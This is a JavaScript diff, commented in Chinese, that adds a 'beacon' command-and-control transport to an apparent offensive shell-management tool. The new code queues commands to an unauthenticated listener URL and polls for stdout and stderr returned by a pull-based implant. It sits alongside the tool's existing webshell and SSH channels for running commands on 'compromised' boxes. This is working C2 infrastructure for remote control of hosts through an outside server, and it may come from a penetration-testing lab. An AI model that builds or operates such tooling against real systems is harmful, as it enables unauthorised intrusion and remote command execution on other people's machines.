@@ -74,6 +74,7 @@ function loadShells() {
 loadShells();
 
 const MAX_OUT = 64 * 1024;
+export const BEACON_EXEC_MAX_MS = 120_000;  // beacon exec 等回传上限(拉取式会话, 高于 web 60s/对齐 ssh 120s)
 
 /** transportRef "user:pass@host[:port]" — CS1-R6: 三处逐字正则收敛。 */
 const SSH_REF_RE = /^(.+?):(.*?)@([^:]+)(?::(\d+))?$/;
@@ -182,6 +183,9 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
         const m = SSH_REF_RE.exec(tr);
         return m ? m[3] : null;
       }
+      if (shell.transport === 'beacon') {
+        try { return new URL(String(shell.transportRef || '')).hostname || null; } catch { return null; }
+      }
     } catch { return null; }
     return null;
   }
@@ -266,6 +270,17 @@ export function createShellRegistry({ bus, listScope } = {}) {  // CS20-11: wal 
       return { error: 'ssh transportRef 需 user:pass@host[:port]' };
     if (transport === 'local' && !tr)
       return { error: 'local transportRef 需 容器名[:用户] (如 pxlab:www-data)' };
+    if (transport === 'beacon') {
+      // beacon 通道: transportRef = listener 基址(deploy/beacon-listener.py)。
+      // P2(对抗审查): 归一化(trailing 空白/斜杠)在校验与持久化两侧对称——
+      // 此前校验用剥离副本而持久化原值, 带尾空白的注册 exec 恒 ERR_INVALID_URL。
+      const base = String(tr).trim().replace(/\/+$/, '');
+      let u = null;
+      try { u = new URL(base); } catch { /* 非法 URL 走下方拒 */ }
+      if (!u || (u.protocol !== 'http:' && u.protocol !== 'https:'))
+        return { error: 'beacon transportRef 需为监听器 URL(如 http://host:19997)' };
+      if (base !== tr) transportRef = base;  // 持久化归一化值
+    }
     const sh = {
       id, name: name || id, target, transport, transportRef, note,
       tags: Array.isArray(tags) ? tags.slice(0, 8).map(String) : [],
@@ -605,6 +620,60 @@ function dockerLiveProbe() {
             ? `(timeoutMs 超出 web 通道上限, 已按 ${cappedAt}ms 硬杀)` : '';
           return { ok: false, error: `webshell 通道异常:${why}${capNote}。目标 ${String(url).slice(0, 100)}` };
         }
+      } else if (sh.transport === 'beacon') {
+        // transportRef = beacon-listener 基址(deploy/beacon-listener.py; 无认证,
+        // 与 OOB 收集器同形态——公网监听+工程配额)。exec=入队+轮询等回传:
+        // 会话拉取式, 回传时刻由 beacon 心跳间隔决定, 与 web 通道的同步
+        // HTTP 语义不同(拉取端不在线时命令排队而非立即失败)。
+        const base = String(sh.transportRef || '').replace(/\/+$/, '');
+        const effTimeout = Math.min(timeoutMs, BEACON_EXEC_MAX_MS);
+        const cappedB = timeoutMs > BEACON_EXEC_MAX_MS ? BEACON_EXEC_MAX_MS : undefined;
+        try {
+          const enq = await fetch(`${base}/op/${sh.id}`, {
+            method: 'POST',
+            headers: { 'content-type': 'application/json' },
+            body: JSON.stringify({ cmd: command }),
+            signal: AbortSignal.timeout(10_000),
+          });
+          if (enq.status === 429) {
+            return { ok: false, error: `beacon 待办队列满(≥16, 会话疑似离线)——先 exec 'echo alive' 探活; 迟到任务随 TTL(10min)过期` };
+          }
+          if (!enq.ok) return { ok: false, error: `beacon 入队失败 HTTP ${enq.status}` };
+          var beaconTaskId = (await enq.json()).id;
+        } catch (e) {
+          return { ok: false, error: `beacon listener 不可达(${String(e?.cause?.code ?? e?.message ?? e).slice(0, 80)})——检查 ${base} 与 spectre-beacon 服务` };
+        }
+        const deadlineB = Date.now() + effTimeout + 2_000;
+        let gotB = null;
+        while (Date.now() < deadlineB) {
+          await new Promise(r => setTimeout(r, 1_000));
+          try {
+            const pr = await fetch(`${base}/op/${sh.id}?id=${encodeURIComponent(beaconTaskId)}`,
+              { signal: AbortSignal.timeout(10_000) });
+            if (pr.status === 200) { gotB = await pr.json(); break; }
+            if (pr.status === 404) {
+              return { ok: false, error: `beacon 任务 ${beaconTaskId} 被回收(TTL 10min)或 id 失效——重发命令` };
+            }
+            // 202=pending → 等下一拍
+          } catch { /* 单拍轮询网络抖动不终止等待窗 */ }
+        }
+        if (!gotB) {
+          // P2(对抗审查): 超时≠未执行——任务仍在队列, beacon 上线即执行。
+          // 与 web/ssh 超时命令同权进任务史与审计链("每条命令进审计"零盲区)。
+          sh.cmdCount += 1;
+          sh.lastActiveAt = new Date().toISOString();
+          sh.tasks.push({ n: sh.cmdCount, command: command.slice(0, 500), code: null,
+            ms: Date.now() - t0, at: sh.lastActiveAt, timeoutPending: true });
+          if (sh.tasks.length > 100) sh.tasks.splice(0, sh.tasks.length - 100);
+          persistShells();
+          audit('shell-exec', { id, target: sh.target, cmd: command.slice(0, 120),
+            code: null, ms: Date.now() - t0, timeoutPending: true });
+          return { ok: false, error: `beacon ${effTimeout}ms 内未回传(会话离线或心跳间隔过长)——任务仍在队列, beacon 上线即执行; 先 exec 'echo alive' 探活确认会话活性${cappedB ? `(timeoutMs 已按 beacon 上限裁剪为 ${cappedB}ms)` : ''}` };
+        }
+        stdout = String(gotB.stdout ?? '');
+        stderr = String(gotB.stderr ?? '');
+        code = Number.isFinite(Number(gotB.code)) ? Number(gotB.code) : 0;
+        layerNote = `code=beacon 端侧回传 rc(往返 ${gotB.ms ?? '?'}ms)`;
       } else if (sh.transport === 'local') {
         // transportRef binds the shell to ONE exec box — commands land in
         // the compromised box, never the runtime host. Format "container"
